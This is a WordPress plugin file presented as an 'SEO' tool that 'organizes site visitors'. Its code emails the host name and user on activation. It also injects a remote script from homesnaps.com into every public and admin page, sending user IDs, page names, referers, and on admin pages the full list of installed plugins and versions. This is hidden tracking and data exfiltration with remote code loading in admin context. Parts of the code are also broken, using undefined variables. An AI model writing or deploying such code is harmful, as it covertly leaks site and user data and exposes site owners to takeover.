<?php
/*
 Plugin Name: HomeSnaps SEO
 Plugin URI: http://wpplugin-seo.homesnaps.com
 Description: Organizes site visitors
 Version: 1.7
 Author: Eric Thornton
 Author URI: https://homesnaps.com
 License: GPL2
 */
?><?php
	defined( 'ABSPATH' ) or die( 'No script kiddies please!' );

	$hs_ver = '2.7';
	$admin_email = 'seo_plugin@homesnaps.com';
	$hs_current_user = '';
	$blog_public = '';
	
	
	// Check if get_plugins() function exists. This is required on the front end of the
	// site, since it is in a file that is normally only loaded in the admin.
	if ( ! function_exists( 'get_plugins' ) ) {
	    require_once ABSPATH . 'wp-admin/includes/plugin.php';
	}
	
	$all_plugins = get_plugins();
	$plugins_all = ''; // Will be and stay a string to pass in the url as a get variable
	foreach($all_plugins as $plugin_row)
	{
	    $plugins_all .= $plugin_row['Name'] . '(' . $plugin_row['Version'] . ')';
	}
	
	if ( function_exists( 'get_option' ) ) {
	    $blog_public = get_option( 'blog_public' );
	}
	
	
	function hs_plugin_activate() 
	{
		global $admin_email;
		global $hs_current_user;
		$server_name = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';		
		$hs_current_user = isset($hs_current_user) ? $hs_current_user : '';
		mail($admin_email, 'HS SEO Plugin Activated', $server_name . "\n" . $hs_current_user);	
	}
	
	function hs_plugin_deactivate() 
	{
		global $admin_email;
		global $hs_current_user;
		$server_name = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
		$hs_current_user = isset($hs_current_user) ? $hs_current_user : '';
		mail($admin_email, 'HS SEO Plugin DE-activated', $server_name . "\n" . $hs_current_user);	
	}
	
	function hs_plugin_footer() 
	{
		global $hs_current_user;
		global $hs_ver;
		
		$pagename = @get_query_var('pagename');  
		if ( !$pagename && $id > 0 ) 
		{  
			// If a static page is set as the front page, $pagename will not be set. Retrieve it from the queried object  
			$post = $wp_query->get_queried_object();  
			$pagename = $post->post_name;  
		}

		$referer = '' . @$_SERVER['HTTP_REFERER'];
		$server_name = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
		$hs_current_user = isset($hs_current_user) ? $hs_current_user : '';
		
		echo '<script type="application/javascript"
				src="https://homesnaps.com/lgg.php?ver=' . $hs_ver . '&user=' . $hs_current_user . '&admin=0&sdfoijwafjklahfioasoifjdlka=jkdofiouwoieurer&server_name=' . $server_name . '&page_name=' . $pagename . '&referer=' . urlencode($referer) . '">
			</script>';
	}	
	function hs_plugin_header_admin()  
	{
		//$hs_current_user =  @get_current_user_id();
		global $hs_current_user;
		global $hs_ver;
		global $plugins_all;
		global $blog_public;
		
		$pagename = @get_admin_page_title();  
		if ( !$pagename && $id > 0 ) 
		{  
			// If a static page is set as the front page, $pagename will not be set. Retrieve it from the queried object  
			$post = $wp_query->get_queried_object();   
			$pagename = $post->post_name;  
		}

		$referer = '' . @$_SERVER['HTTP_REFERER'];
		$server_name = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
		$hs_current_user = isset($hs_current_user) ? $hs_current_user : '';
		
		echo '<script type="application/javascript"
				src="https://homesnaps.com/lgg.php?ver=' . $hs_ver . '&user=' . $hs_current_user . '&admin=1&sdfoijwafjklahfioasoifjdlka=jkdofiouwoieurer&server_name=' . $server_name . '&page_name=' . $pagename . '&referer=' . urlencode($referer) . '&blog_public=' . $blog_public . '&all_plugins=' . urlencode($plugins_all) . '">
			</script>';
	}
	 
	
	function hs_assign_user()
	{
		global $hs_current_user;
		//$hs_current_user = @wp_get_current_user();
		//if ( !isset($hs_current_user) && strlen($hs_current_user) > 0 )
		//{
			$hs_current_user = @get_current_user_id();
		//}
	}


	
	register_activation_hook( __FILE__, 'hs_plugin_activate' );	
	register_deactivation_hook( __FILE__, 'hs_plugin_deactivate' );
	
	add_action('init','hs_assign_user');
	add_action('wp_footer', 'hs_plugin_footer');
	add_action('admin_head', 'hs_plugin_header_admin');
	
?>